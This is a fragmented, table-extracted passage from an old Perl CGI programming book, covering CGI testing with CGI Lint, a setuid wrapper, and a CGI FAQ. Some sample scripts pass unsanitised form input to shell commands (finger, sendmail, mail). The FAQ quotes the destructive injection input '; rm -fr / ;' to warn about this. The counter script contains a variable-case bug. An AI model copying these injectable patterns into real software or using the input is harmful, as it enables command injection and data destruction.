"<P><A HREF=""http://bin.gnn.com/cgi-bin/imagemap/radio""> ",NA,NA
"<IMG SRC=""/gnn/bus/ora/radio.gif""  ALT="""" ISMAP></A> .",NA,NA
. ,NA,NA
.,NA,NA
</BODY></HTML>,NA,NA
Connection closed by foreign host.,NA,NA
"You can enter other HTTP commands as well. But remember that HTTP is a stateless protocol. In other words, you ",NA,NA
"can issue only one request, after which the server terminates the connection. Now let's look at the issues behind ",NA,NA
server simulation.,NA,NA
Server Simulation,NA,NA
"If you do not have access to a server on a full-time basis, you can simulate the features of a server quite easily. ",NA,NA
"Before we look at how this can be accomplished, let's look briefly at what the server actually does:",G,NA
Gets a request from the client to serve a resource (either a file or a CGI program).,G,NA
Checks to see if the file is a CGI script.,G,NA
"If it is, passes various environment variables/input stream to the CGI program, and waits for output.",G,NA
Sends the output from either a regular file or CGI to the client.,NA,NA
"In order to test CGI scripts, all we would have to do is emulate the third step in this process. Let's look at a typical ",NA,NA
"GET request. First, we have to create a file to set the environment variables (e.g., ",NA,NA
environment.vars,NA,NA
). Here is how ,NA,NA
you can do it in the C shell:,NA,NA
setenv REQUEST_METHOD     'GET' ,NA,NA
setenv QUERY_STRING       'name=John%20Surge&company=ABC%20Corporation%21' ,NA,NA
"setenv HTTP_ACCEPT        'image/gif, image/x-xbitmap, image/jpeg, */*' ",NA,NA
setenv SERVER_PROTOCOL    'HTTP/1.0' ,NA,NA
setenv REMOTE_ADDR        '198.198.198.198' ,NA,NA
setenv DOCUMENT_ROOT      '/usr/local/bin/httpd_1.4.2/public' ,NA,NA
setenv GATEWAY_INTERFACE  'CGI/1.1' ,NA,NA
setenv REQUEST_METHOD     'GET' ,NA,NA
setenv SCRIPT_NAME        '/cgi-bin/abc.pl' ,NA,NA
setenv SERVER_SOFTWARE    'NCSA/1.4.2' ,NA,NA
setenv REMOTE_HOST        'gateway.cgi.com',NA,NA
"In a Bourne-compatible shell (such as Korn shell, bash, or zsh), the previous commands will not work. Instead, you ",NA,NA
need the following syntax:,NA,NA
export REQUEST_METHOD = 'GET' ,NA,NA
export QUERY_STRING =  'name=John%20Surge&company=ABC%20Corporation%21' ,NA,NA
.,NA,NA
.,NA,NA
.,NA,NA
"Then, we have to execute this script with the following command (assuming the commands are stored in the file ",NA,NA
environment.vars,NA,NA
) in the C shell:,NA,NA
% source environment.vars ,NA,NA
"In a Bourne-compatible shell, you need to do the following:",NA,NA
% . environment.vars,NA,NA
"Now, you can simply run your CGI script, and it should work as though it was being executed by the server. For ",NA,NA
"POST requests, the process is slightly different. You first have to create a file that contains the POST information ",NA,NA
"(e.g., ",NA,NA
post_data.txt,NA,NA
):,NA,NA
name=John%20Surge&company=ABC%20Corporation%21&sports=Basketball& ,NA,NA
exercise=3&runners=no,NA,NA
"Once that is done, you need to determine the content length (or the size in bytes) of the data. You can do that with ",NA,NA
the ,NA,NA
wc,NA,NA
 command:,NA,NA
% wc -c post_data.txt,NA,NA
 86,NA,NA
Then you need to add the following two lines to the environment variable file that we created above (assuming C ,NA,NA
shell):,NA,NA
setenv REQUEST_METHOD     'POST' ,NA,NA
setenv CONTENT_LENGTH     '86',NA,NA
Now all you have to do is send the data in the file to the CGI program through a pipe:,NA,NA
% /usr/local/bin/httpd_1.4.2/cgi-bin/abc.pl < post_data.txt,NA,NA
"That's all there is to it. The CGI Lint application automates this procedure, as we will see next.",NA,NA
Environment Variables,NA,NA
CGI Lint--A,NA,NA
Debugging/Testing Tool,NA,NA
12.5 CGI Lint--A Debugging/Testing Tool,"CGI Lint greatly simplifies the process of testing and debugging CGI applications. 
 Appendix E, 
 Applications, Modules, 
 Utilities, and Documentation
 , lists where you can get CGI Lint.
  
 Depending on the type of request (either GET or POST), either one or two auxiliary files are required by CGI Lint. The 
 first is a configuration file, which should contain a list of the environment variables in the following format:
  
 REQUEST_METHOD     =   GET 
  
 QUERY_STRING       =   name=John Surge&company=ABC Corporation! 
 HTTP_ACCEPT        =   image/gif, image/x-xbitmap, image/jpeg, */* 
 SERVER_PROTOCOL    =   HTTP/1.0 
  
 REMOTE_ADDR        =   198.198.198.198 
  
 SERVER_ROOT        =   /usr/local/bin/httpd_1.4.2 
  
 DOCUMENT_ROOT      =   /usr/local/bin/httpd_1.4.2/public 
  
 GATEWAY_INTERFACE  =   CGI/1.1 
  
 SCRIPT_NAME        =   /cgi-bin/abc.pl 
  
 SERVER_SOFTWARE    =   NCSA/1.4.2 
  
 REMOTE_HOST        =   gateway.cgi.com
  
 This format has an advantage over the previous one: You do not need to encode the query string. However, if you have 
 either %, &, or = characters in the query string, you need to escape them by placing a ""\"" before them:
  
 QUERY_STRING       =   name=Joe\=Joseph&company=JP \& Play&percentage=50\%
  
 Or you can just use the encoded values of %25, %26, and %3d to represent the ""%,"" ""&,"" and ""="" characters, 
 respectively. Now, you are ready to test out your CGI program:
  
 % CGI_Lint get.cfg
  
 CGI Lint executes the script that is pointed to by the environment variables SCRIPT_NAME and SERVER_ROOT. In 
 addition, you can use a data file to store query information. Here is an example:
  
 % CGI_Lint form.cfg form.data
  
 The format for the data file should be:
  
 name = Joe\=Joseph 
  
 company = JP \& Play 
  
 percentage = 50\%
  
 If you already have data stored in QUERY_STRING, CGI Lint will process the data from both sources. In the case of 
 POST requests, all you have to do is change the REQUEST_METHOD to ""POST"" and run it in the same exact way as 
 before:
  
 % CGI_Lint form.cfg form.data",NA
CGI Lint in Action,"Let's take a simple CGI program and run it through CGI Lint, and see what happens. Here is the program-it should be 
 familiar to you, as it was introduced at the end of 
 Chapter 7, 
 Advanced Form Applications
 :
  
 #!/usr/local/bin/perl 
  
 &parse_form_data(*simple); 
  
 $user = $simple{'user'}; 
  
 print ""Content-type: text/plain"", ""\n\n""; 
  
 print ""Here are the results of your query: "", ""\n""; 
 print `/usr/ucb/finger $user`; 
  
 print ""\n""; 
  
 exit (0);
  
 This program outputs finger information about the specified user. Here is the form that is associated with the program:",NA
12.6 Set UID/GID Wrapper,NA,NA
"Now that we have a debugging/lint tool for CGI programs, how do we set this up so that it executes as ",NA,NA
"the same UID as that of the Web server? If the Web server runs with your own UID, then you do not ",NA,NA
"have to do anything. But, if it runs as some other UID, say ""nobody"" or ""www,"" then you have to ask ",NA,NA
the system administrator to run a script called ,NA,NA
wrapper,NA,NA
", which sets the UID/GID bits. Let's quickly ",NA,NA
look at this script.,NA,NA
The wrapper is based on a program in the book ,NA,NA
Programming Perl,NA,NA
 by Larry Wall and Randal ,NA,NA
Schwartz (two of the most knowledgable Perl gurus around). Here is the format for the ,NA,NA
wrapper ,NA,NA
command:,NA,NA
% wrapper -f /usr/local/bin/CGI_Lint -u nobody -g none,NA,NA
The ,NA,NA
-f,NA,NA
" switch specifies the filename to use, while the ",NA,NA
-u,NA,NA
 and the ,NA,NA
-g,NA,NA
" switches set the UID and GID, ",NA,NA
respectively. You could also use numerical identification numbers:,NA,NA
% wrapper -f /usr/local/bin/CGI_Lint -u 628120 -g 120,NA,NA
"This will create a C executable with the specified UID and GID bits set, that will, in turn, run the CGI ",NA,NA
script.,NA,NA
CGI Lint--A,NA,NA
Debugging/Testing Tool,NA,NA
Perl CGI Programming FAQ,NA,NA
A. Perl CGI Programming FAQ,"Contents: 
  
 Introduction 
  
 Modules
  
 CGI and the WWW Server
  
 Specific Programming Questions
  
 Security",NA
A.1 Introduction,NA,NA
Why does my HTML page/form need a script?,"There are times when you might want to have some dynamic information (information that is not constant) in your HTML documents. This 
 could include simple information such as the date and time, or a counter that displays ""You are visitor number xxx"", but it could also include 
 such things as pie charts/graphs based on user input, results from searching a database, or animations. And the only way you can produce 
 results like these is with CGI scripts (though you can also do so with client-side applications like Java and JavaScript, but that's a totally 
 different story!).",NA
What does CGI stand for?,"Here is an excellent description that my editor, Andy Oram, wrote up:
  
 Common
  
 Assures you that CGI can be used by many languages and interact with many different types of systems. It doesn't tie you down to one 
 way of doing what you want.
  
 Gateway
  
 Suggests that CGI's strength lies not in what it does by itself, but in the potential access it offers to other systems such as databases 
 and graphic generators.
  
 Interface
  
 Means that CGI provides a well-defined way to call up its features--in other words, that you can write programs that use it.",NA
What ,NA,NA
is,NA,NA
" a script, anyway? What can I do with a script?","Simply put, a script is a program! OK, OK, there are semantic differences between the two words. If you really want to know, pick up a 
 book on computer programming (or is that computer scripting :-)
  
 You can create a lot of magic by writing a CGI program/script. You can create graphics on the fly, access databases and return results, and 
 connect to other Internet information servers.",NA
What is Perl and why do so many people use it for CGI?,"The answer is located in the first three lines of the Perl manpage:
  
 Perl is an interpreted language optimized for scanning arbitrary text files, extracting information from those text files, and 
 printing reports based on that information.
  
 Most CGI applications involve manipulating data in some fashion and accessing external programs and applications. Perl provides 
 easy-to-use tools that make these tasks a cinch.",NA
Is there a book or online docs on CGI and/or Perl programming?,"Here is a list of books on CGI and Perl. I got this list from Cye H. Waldman: 
  
  
 G 
 NCSA CGI Documentation (
 http://hoohoo.ncsa.uiuc.edu/cgi
 ) 
  
  
 G 
 Forms Tutorial (
 http://robot0.ge.uiuc.edu/~carlosp/cs317/ft.4-5.html
 ) 
  
  
 G 
 CGI FAQ (
 http://www.best.com/~hedlund/cgi-faq 
  
  
 G 
  
 Perl FAQ (<
 http://mox.perl.com/perl/faq/index.html
 ) 
  
 G 
 WWW Security FAQ (by Lincoln Stein) (
 http://www-
 genome.wi.mit.edu/WWW/faqs/www-security-faq.html
 ) 
  
 G 
 CGI Security FAQ (by Paul Phillips) 
 (
 http://www.cerf.net/~paulp/cgi-security/safe-cgi.txt
 ) 
  
  
 G 
 WWW FAQ (
 http://boutell.com/faq
 ) 
  
 Here is a table of books and CD-ROMS about CGI and Perl:
  
 Author
  
 Title
  
 Publisher
  
 Medium Price
  
 Christian 
 Neuss & 
 Johan 
  
 Vromans
  
 The Webmaster's Handbook: Perl Power for Your Web Server 
 (
 http://zelda.thomson.com/itcp/neuss/neuss.html
 )
  
 Int'l Thomson
  
 CD-ROM $30
  
 William E. 
 Weinman
  
 The CGI Book
  
 New Riders
  
 CD-ROM $45
  
 Garbus et al.
  Perl Programming Unleashed
  (March 1996)
  
 Sams.net
  
 CD-ROM ??
  
 Steven E.
  
 Brenner & 
  
 Edwin Aoki
  
 Introduction to CGI & Perl: WebScripts 
  
 http://www.mispress.com/introcgi
  /online_app.html
 )
  
 MIS:Press/M&T 
 Books
  
 ??
  
 Ed Tittel et 
 al.
  
 Perl 5 Programming Secrets
  (March 1996)
  
 IDG Books
  
 CD-ROM ??
  
 Mitzelfelt
  
 Special Edition Using Perl
  
 Que
  
 ??
  
 Shishir 
  
 Gundavara
 m
  
 CGI Programming on the World Wide Web 
  
 (
 http://www.ora.com/gnn/bus/ora/item/cgi_prog.html
 )
  
 O'Reilly
  
 $30
  
 Rob Farrel
  
 The Official 60 Minute Guide to CGI Programming with Perl 
  
 (
 http://db.www.idgbooks.com/database/book/isbn/generic-book.tmpl?query=1-56884-780-7
 )
  
 IDG Books
  
 $20
  
 Ed Tittel et 
 al.
  
 Web Programming Secrets
  
 IDG Books
  
 CD-ROM $40
  
 John Deep
  
 Developing CGI Applications with Perl
  (Dec 1995)
  
 Wiley
  
 $30
  
 Jon Orwant
  Perl 5 Interactive
  (February 1996)
  
 Waite
  
 $30
  
 Reggie 
 David
  
 Perl 5 How-To
  (Spring 1996)
  
 Waite
  
 CD-ROM $40
  
 Eric 
  
 Herrmann
  
 Teach Yourself CGI Programming with Perl in a Week
  
 Sams.net
  
 $30
  
 Walnut 
  
 Creek 
  
 CDROM
  
 Perl
  (Collected resources, archives, tutorial, examples, source code, etc.)
  
 Walnut Creek 
 CDROM
  
 CD-ROM $40
  
 Carl Dichter 
 & Mark 
  
 Pease
  
 Software Engineering with Perl
  (This is an advanced text for software professionals; it is not 
 a tutorial.)
  
 (
 http://www.prenhall.com/013/
  016964/ptr/01696-4.htm
 )
  
 Prentice Hall
  
 Disk
  
 $30
  
 Ellie 
  
 Quigley
  
 Perl by Example
  
 Prentice Hall
  
 $27
  
 John 
  
 December 
 & Mark 
  
 Ginsburg
  
 HTML & CGI Unleashed
  
 Sams.net
  
 CD-ROM $50
  
 David Till
  
 Teach Yourself Perl in 21 Days
  
 Sams
  
 Print
  
 $30
  
 Larry Wall 
  
 & Randal L.
  
 Schwartz
  
 Programming Perl
  
 O'Reilly
  
 Print
  
 $30
  
 Randal L. 
 Schwartz
  
 Learning Perl
  
 O'Reilly
  
 Print
  
 $25
  
 Ed Tittel et 
 al.
  
 Foundations of WWW Programming with HTML and CGI
  
 IDG Books
  
 CD-ROM $40",NA
Is there a mailing list or newsgroup for this kind of thing?,"There is a very useful newsgroup: 
 comp.infosystems.www.authoring.cgi
 , that is ""monitored"" by numerous CGI experts. However, you 
 should 
 not
  post a question to this group (or any other group, for that matter), until you have read the FAQ.
  
 Various mailing lists for CGI and the Web exist, as well. Here are two of the most popular: 
 cgi-perl-request@webstorm.com
  [
 http://www.webstorm.com/local/cgi-perl
 ]
  
 This list is for those who are writing or interested in writing Perl 5 modules for CGI. It is 
 not
  intended for any type of CGI support. Tim 
 Bunce (
 Tim.Bunce@ig.co.uk
 ) wrote several elegant and useful CGI modules, although they are currently maintained by Lincoln Stein 
 (
 lstein@genome.wi.mit.edu
 ). These modules are located at: 
  
 http://www-genome.wi.mit.edu/WWW/tools/scripting/CGIperl
  
 Lincoln has also written an excellent book on the Web and CGI (see the preceding table). 
 libwww-perlrequest@ics.uci.edu
  [
 http://www.ics.uci.edu/WebSoft/libwww-perl/archive
 ]
  
 libwww-perl
  is a Perl library that provides a simple and consistent programming interface to the Web.
  
 You can access the Perl 4 distribution at: 
  
 http://www.ics.uci.edu/pub/websoft/libwww-perl
  
 The Perl 5 
 libwww
  modules are located at: 
  
 http://www.os/oslonett.no/home/aas/perl/www
  
 Are there archives on the net of mailings or postings about this?
  
 Yes, look at: 
  
 The Usenet Newstand (
 http://CriticalMass.com/Concord/
 )
  
 All of the 
 comp.infosystems.www.*
  newsgroups are archived. In addition, the 
 cgi-perl
  and 
 libwww
  mailing lists are archived as well.
  
  
  
 Set UID/GID Wrapper
  
  
  
 Modules",NA
A.2 Modules,NA,NA
Should I use the Perl CGI modules to code all my CGI scripts? Isn't ,NA,NA
it easier to do it myself?,NA,NA
It really depends on what you are trying to do. The CGI modules should generally be used for ,NA,NA
"heavy-duty CGI scripts. For simple scripts, it is far easier and quicker to roll your own or use CGI ",NA,NA
Lite (current version is v1.62 ,NA,NA
http://bytor.engr.wisc.edu/pub/perl/cpan/authors/id/SHGUN/CGI_Lite-1.62.pm.gz,NA,NA
). If you really,NA,NA
"want, you can even use the Perl 4 ",NA,NA
cgi-lib.pl,NA,NA
 library (,NA,NA
http://www.bio.cam.ac.uk/web/form.html,NA,NA
).,NA,NA
How do I figure out how xyz module works?,NA,NA
"Most modules have manpages embedded within the module itself. If that is the case, you can use the ",NA,NA
pod2man,NA,NA
 script to view the manpage:,NA,NA
% pod2man module.pm | nroff -man | more ,NA,NA
What CGI or WWW libraries are available for Perl4? Which should I ,NA,NA
"use, and why?",NA,NA
The most widely used CGI library for Perl 4 is ,NA,NA
cgi-lib.pl,NA,NA
 written by Steven Benner ,NA,NA
(,NA,NA
http://www.bio.cam.ac.uk/web/form.html,NA,NA
"). It is very, very simple to use!",NA,NA
"What CGI modules are available for Perl 5? Which should I use, ",NA,NA
and why?,NA,NA
CGI::* Modules,NA,NA
(,NA,NA
http://www-genome.wi.mit.edu/WWW/tools/scripting/CGIperl/,NA,NA
),NA,NA
These modules allow you to create and decode forms as well as maintain state between forms.,NA,NA
CGI Lite,NA,NA
(,NA,NA
http://bytor.engr.wisc.edu/pub/perl/cpan/authors/id/SHGUN/CGI_Lite-1.62.pm.gz,NA,NA
),NA,NA
An alternative to the CGI::* modules. It is a glorious Perl 5 version of ,NA,NA
cgi-lib.pl,NA,NA
.,NA,NA
Both of these modules have the ability to decode the ,NA,NA
multipart/form-data,NA,NA
 encoding scheme.,NA,NA
Why are so many of these CGI Perl libraries object oriented? I ,NA,NA
don't know O-O programming. Aren't there simpler libraries for ,NA,NA
non-programmers to use? How hard can it be?,NA,NA
You can use ,NA,NA
cgi-lib.pl,NA,NA
 (,NA,NA
http://www.bio.cam.ac.uk/web/form.html,NA,NA
"), which is not object oriented, ",NA,NA
because it was designed for Perl 4.,NA,NA
"But, using the Perl 5 O-O libraries is a piece of cake! Here is a simple example that uses CGI Lite ",NA,NA
(,NA,NA
http://bytor.engr.wisc.edu/pub/perl/cpan/authors/,NA,NA
 id/SHGUN/CGI_Lite-1.62.pm.gz,NA,NA
) to print out form ,NA,NA
data:,NA,NA
#!/usr/local/bin/perl5 ,NA,NA
use CGI_Lite; ,NA,NA
"print ""Content-type: text/plain"", ""\n\n"";",NA,NA
$cgi = new CGI_Lite () ,NA,NA
$cgi->parse_form_data (); ,NA,NA
$cgi->print_form_data (); ,NA,NA
exit (0);,NA,NA
Introduction,NA,NA
CGI and the WWW Server,NA,NA
A.3 CGI and the WWW Server,NA,NA
Where does my Perl CGI program have to live to execute? What is ,NA,NA
the ,NA,NA
cgi-bin,NA,NA
 directory for?,NA,NA
The server is generally configured so that it executes CGI scripts that are located in the ,NA,NA
cgi-bin ,NA,NA
"directory. However, the server administrator can set up aliases in the server configuration files, so that ",NA,NA
"scripts with certain extensions (i.e., ",NA,NA
.cgi,NA,NA
", ",NA,NA
.pl,NA,NA
) can also be executed.,NA,NA
What are file access permissions? How do I change them?,NA,NA
"File permissions allow read, write, and execute access to users based on their user identification (also ",NA,NA
"known as UID), and their membership in certain groups. You can use the command ",NA,NA
chmod,NA,NA
 to change ,NA,NA
a file's permissions. Here is an example:,NA,NA
% ls -ls form.cgi,NA,NA
 1 -rwx------  1 shishir       974 Oct 31 22:15 form.cgi*,NA,NA
"This has a permission of 0700 (octal), which means that no one (besides the owner) can read to, write ",NA,NA
"from, or execute this file. Let's use the ",NA,NA
chmod,NA,NA
 command to change the permissions:,NA,NA
% chmod 755 form.cgi,NA,NA
% ls -ls form.cgi,NA,NA
 1 -rwxr-xr-x  1 shishir       974 Oct 31 22:15 form.cgi*,NA,NA
"This changes the permissions so that users in the same group as """,NA,NA
shishir,NA,NA
","" as well as all other users, ",NA,NA
have the permission to read from and execute this file.,NA,NA
See the manpages for the ,NA,NA
chmod,NA,NA
 command for a full explanation of the various octal codes.,NA,NA
Where should Perl be installed so I can execute it?,NA,NA
Perl can be installed anywhere on the system! The only thing you have to ensure is that the server is ,NA,NA
not running in a ,NA,NA
chroot,NA,NA
"-ed environment, and that it can access the interpreter. In other words, system ",NA,NA
"administrators can change the root directory, so that ""/"" does not point to the actual root (""/""), but to ",NA,NA
another directory.,NA,NA
"What should I do when I get a ""Server: Error 500"" message?",NA,NA
You can get a server error for the following reasons:,"G 
  
 G",NA
"If the script does not contain the ""#!/usr/local/bin/perl"" header line that points to the Perl ",NA,NA
"interpreter, or if the path to the interpreter is invalid.",NA,NA
"If the first line output from the script is not a valid HTTP header (i.e., ""Content-type: ",NA,NA
"text/html""), or if there is ",NA,NA
no,NA,NA
 blank line after the header data.,NA,NA
"I try to open a file for writing so I can save my data, but the open ( ) ",NA,NA
command fails. What's going on?,NA,NA
"Generally, the HTTP server will be running as user """,NA,NA
nobody,NA,NA
","" or """,NA,NA
www,NA,NA
","" or some other user ID that ",NA,NA
"has minimal privileges. As a result, the directory (where you intend to create the file) must be ",NA,NA
writeable by this process ID.,NA,NA
"To be on the safe side, always check the return status from the ",NA,NA
open,NA,NA
 ( ) command to see if it was a ,NA,NA
success:,NA,NA
"open (FILE, ""/abc/data.txt"") ||",NA,NA
" &error (""Could not open file /abc/data.txt""); ",NA,NA
.,NA,NA
.,NA,NA
.,NA,NA
sub error {,NA,NA
 local ($message) = @_;,NA,NA
" print ""Content-type: text/html"", ""\n"";",NA,NA
 ,NA,NA
"print ""Status: 500 CGI Error"", ""\n\n"";",NA,NA
 ,NA,NA
"print ""<TITLE>CGI Error </TITLE>"", ""\n"";",NA,NA
 ,NA,NA
"print ""< H1>Oops! Error </H1>"", ""\n"";",NA,NA
 ,NA,NA
"print ""< HR>"", $message, ""< HR>"", ""\n""; }",NA,NA
Modules,NA,NA
Specific Programming,NA,NA
Questions,NA,NA
A.4 Specific Programming Questions,NA,NA
I want the user to fill in a form and mail it to me. How can I do this? ,NA,NA
Are there any examples to show me how?,NA,NA
It is actually a fairly simple process. Your CGI script must be able to perform two tasks:,NA,NA
"Decode the form data. Remember, all data in the form will be URL encoded (let's ignore Netscape ",NA,NA
2.0 multipart MIME messages).,NA,NA
Open a pipe to ,NA,NA
mail,NA,NA
 (or ,NA,NA
sendmail,NA,NA
"), and write the form data to the file.",NA,NA
Let's assume you have an associative array called ,NA,NA
$in,NA,NA
 (for those of you using Steven Brenner's ,NA,NA
cgi-,NA,NA
lib.pl,NA,NA
" library, this should be familiar) that contains the form data. Here is how you would deal with ",NA,NA
sendmail,NA,NA
:,NA,NA
"open (SENDMAIL, ""| /usr/bin/sendmail -f$in{'from'} -t -n -",NA,NA
"oi""); print SENDMAIL <<End_of_Mail; ",NA,NA
From: $in{'from'} <$in{'name'}> ,NA,NA
To: $in{'to'} ,NA,NA
Reply-To: $in{'from'} ,NA,NA
Subject: $in{'subject'} ,NA,NA
$in{'message'} ,NA,NA
End_of_Mail,NA,NA
"One thing you should note is the ""Reply-To:"" header. Since the server is running as user ""nobody,"" ",NA,NA
"the mail headers might be messed up (especially when people are trying to reply to it). The ""Reply-",NA,NA
"To:"" field fixes that.",NA,NA
There are a lot of mail gateways in operation that use ,NA,NA
mail,NA,NA
 in the following format:,NA,NA
"open (MAIL, ""| mail -s 'Subject' $in{'to'}"");",NA,NA
 ^,NA,NA
 |,NA,NA
 +-- Possible security hole!!!!,NA,NA
If you don't check the ,NA,NA
$in{'to'},NA,NA
" variable for shell metacharacters, you're in for a major headache! For ",NA,NA
"example, if some malicious user enters the following:",NA,NA
; rm -fr / ; ,NA,NA
you'll have a major problem on your hands.,NA,NA
The ,NA,NA
formmail,NA,NA
 script looks complicated. Why can't I use a ,NA,NA
mailto: URL so that it just mails me the info the user filled in?,NA,NA
"Unfortunately, the ",NA,NA
mailto:,NA,NA
 command is not supported by all browsers. If you have this command in,NA,NA
"your document, it is a limiting factor, as people who use browsers that do not support this do not have",NA,NA
the ability to send you mail.,NA,NA
How do I do Perl CGI programming from non-UNIX platforms like ,NA,NA
"the Mac, MS-DOS, Windows, and NT? Will my Perl CGI program ",NA,NA
port amongst all these environments? Can it be transparent? I ,NA,NA
"have an account on a UNIX server, but work on a Windows/Mac ",NA,NA
system. How can I test my CGI script on my own system?,NA,NA
"Perl has been ported to all the platforms that are mentioned above. As a result, your Perl CGI program",NA,NA
should be reasonably portable. If you're are interfacing with various external programs on the UNIX,NA,NA
"side, then it probably will not be portable, but if you're just manipulating data, opening and reading",NA,NA
"files, etc., you should have no problem.",NA,NA
"What are STDERR, STDIN, and STDOUT connected to in a Perl ",NA,NA
CGI program?,NA,NA
"In a CGI environment, STDERR points to the server error log file. You can use this to your advantage",NA,NA
"by outputting debug messages, and then checking the log file later on.",NA,NA
"Both STDIN and STDOUT point to the browser. Actually, STDIN points to the server that interprets",NA,NA
"the client (or browser's) request and information, and sends that data to the script.",NA,NA
"In order to catch errors, you can ""dupe"" STDERR to STDOUT early on in your script (after outputting",NA,NA
the valid HTTP headers):,NA,NA
" open (STDERR, "">&STDOUT"");",NA,NA
This redirects all of the error messages to STDOUT (or the browser).,NA,NA
How do I write an access counter script?,NA,NA
Counter scripts tend to be very popular. The idea behind a counter is very simple:,NA,NA
1.  Use a file to store the data,NA,NA
"2. Whenever someone visits the site, increment the number in the file",NA,NA
Here is a simple counter script:,NA,NA
#!/usr/local/bin/perl,NA,NA
"$counter = ""/home/shishir/counter.dat"";",NA,NA
"print ""Content-type: text/plain"", ""\n\n"";",NA,NA
"open (FILE, $counter) || die ""Cannot read from the counter file.\n""; ",NA,NA
"flock (FILE, 2); ",NA,NA
$visitors = <FILE>; ,NA,NA
"flock (FILE, 8); ",NA,NA
close (FILE); ,NA,NA
$VISITORS++; ,NA,NA
"open (FILE, "">"" . $counter) || die ""Cannot write to counter ",NA,NA
"file.\n""; flock (FILE, 2); ",NA,NA
print FILE $visitors; ,NA,NA
"flock (FILE, 8); ",NA,NA
close (FILE);,NA,NA
You can now use SSI (Server Side Includes) to display a counter in your HTML document:,NA,NA
You are visitor number:,NA,NA
"<!--#exec cgi=""/cgi-bin/counter.pl--> ",NA,NA
How can I strip all the HTML tags from a document with a ,NA,NA
Perl substitute?,NA,NA
Here is a simple regular expression that will strip HTML tags:,NA,NA
$line =~ s/<(([^>]|\n)*)>//g;,NA,NA
"Or you can ""escape"" certain characters in an HTML tag so that it can be displayed:",NA,NA
$line =~ s/<(([^>]|\n)*)>/&lt;$1&gt;/g;,NA,NA
How can I tell what user/host/browser called my program?,NA,NA
You can use the environment variable HTTP_USER_AGENT to determine the user's browser.,NA,NA
[ From WWW FAQ ],NA,NA
Five important environment variables are available to your CGI script to help in identifying the ,NA,NA
end user.,NA,NA
HTTP_FROM,NA,NA
"This environment variable is, theoretically, set to the email address of the user. However, ",NA,NA
"many browsers do not set it at all, and most browsers that do support it allow the user to set ",NA,NA
"any value for this variable. As such, it is recommended that it be used only as a default for the ",NA,NA
reply email address in an email form.,NA,NA
REMOTE_USER,NA,NA
This variable is only set if secure authentication was used to access the script. The ,NA,NA
AUTH_TYPE variable can be checked to determine what form of secure authentication was ,NA,NA
used. REMOTE_USER will then contain the name the user authenticated under. Note that,NA,NA
"REMOTE_USER is only set if authentication was actually used, and is not supported by all web ",NA,NA
servers. Authentication may unexpectedly fail to happen under the NCSA server if the method ,NA,NA
used for the transaction is not listed in the ,NA,NA
access.conf,NA,NA
" file (i.e., ",NA,NA
<Limit GET POST>,NA,NA
 should ,NA,NA
"be set rather than the default, ",NA,NA
<Limit GET>,NA,NA
).,NA,NA
REMOTE_IDENT,NA,NA
This variable is set if the server has contacted an IDENTD server on the client machine. This is ,NA,NA
"a slow operation, usually turned off in most servers, and there is no way to ensure that the client ",NA,NA
"machine will respond honestly to the query, if it responds at all.",NA,NA
REMOTE_HOST,NA,NA
"This variable will not identify the user specifically, but does provide information about the site ",NA,NA
"the user has connected from, if the hostname was retrieved by the server. In the absence of any ",NA,NA
"certainty regarding the user's precise identity, making decisions based on a list of trusted ",NA,NA
addresses is sometimes an adequate workaround. This variable is not set if the server failed to ,NA,NA
look up the hostname or skipped the lookup in the interest of speed; see REMOTE_ADDR ,NA,NA
below. Also keep in mind that you may see all users of a particular proxy server listed under ,NA,NA
one hostname.,NA,NA
REMOTE_ADDR,NA,NA
"This variable will not identify the user specifically, but does provide information about the site ",NA,NA
the user has connected from. REMOTE_ADDR will contain the dotted-decimal IP address of ,NA,NA
"the client. In the absence of any certainty regarding the user's precise identity, making decisions ",NA,NA
based on a list of trusted addresses is sometimes an adequate workaround. This variable is ,NA,NA
"always set, unlike REMOTE_HOST, above. Also keep in mind that you may see all users of a ",NA,NA
particular proxy server listed under one address.,NA,NA
[ End of info from WWW FAQ ],NA,NA
"Can people read my Perl CGI program? If they do, is it a ",NA,NA
security problem that they know how my code works? How can ,NA,NA
I hide it?,NA,NA
"If you configure your server so that it recognizes that all files in a specific directory (i.e., ",NA,NA
/cgi-bin,NA,NA
"), or ",NA,NA
"files with certain extensions (i.e., ",NA,NA
.pl,NA,NA
", ",NA,NA
.tcl,NA,NA
", ",NA,NA
.sh,NA,NA
", etc.) are CGI programs, then it will execute the ",NA,NA
programs. There is no way for users to see the script itself.,NA,NA
"On the other hand, if you allow people to look at your script (by placing it, for example, in ",NA,NA
"the document root directory), it is not a security problem, in most cases.",NA,NA
Do I have to copy the whole Perl library into my ,NA,NA
htdocs,NA,NA
 directory?,NA,NA
"No, your CGI scripts can access files outside the server and document root directories, unless ",NA,NA
the server is running in a ,NA,NA
chroot,NA,NA
-ed environment.,NA,NA
Why shouldn't I have people type in passwords or social security ,NA,NA
numbers or credit card numbers? Isn't that what ,NA,NA
TYPE,NA,NA
"=""password"" ",NA,NA
is for?,NA,NA
No!,NA,NA
" The forms interface allows you to have a ""password"" field, but it should not be used for anything",NA,NA
highly confidential. The main reason for this is that form data gets sent from the browser to the Web ,NA,NA
"server as plain text, and not as encrypted data.",NA,NA
"If you want to solicit secure information, you need to purchase a secure server, such as Netscape's ",NA,NA
Commerce Server (,NA,NA
http://home.netscape.com/comprod/netscape_commerce.html,NA,NA
).,NA,NA
How do I generate separate pages for Netscape vs. the rest of ,NA,NA
the world?,NA,NA
You can have your CGI script determine whether your script is being accessed by Netscape:,NA,NA
$browser = $ENV{'HTTP_USER_AGENT'}; ,NA,NA
if ($browser =~ /Mozilla/) {,NA,NA
 #,NA,NA
 # Netscape,NA,NA
 # ,NA,NA
} else {,NA,NA
 #,NA,NA
 # Non Netscape,NA,NA
 # ,NA,NA
},NA,NA
Why doesn't my system ( ) output come out in the right order?,NA,NA
This has to do with the way the standard output is buffered. In order for the output to display in the ,NA,NA
"correct order, you need to turn buffering off by using the $| variable:",NA,NA
$| = 1; ,NA,NA
I hear that Netscape is going to support Java. Does that mean ,NA,NA
I have to use Java now instead of Perl? Should I?,NA,NA
"No, no! The concept of Java is totally different from that of CGI. CGI refers to server-side ",NA,NA
"execution, while Java refers to client-side execution. There are certain things (like animations) that ",NA,NA
"can be improved by using Java. However, you can continue to use Perl to develop server-side ",NA,NA
applications.,NA,NA
"For more information, here are a few documents you can look at:",NA,NA
Sun's Java Documentation (,NA,NA
http://sun.java.com,NA,NA
),NA,NA
Java uber Alles,NA,NA
 (,NA,NA
http://mox.perl.com/perl/versus/java.html,NA,NA
) by Tom Christiansen,NA,NA
tchrist@mox.perl.com,NA,NA
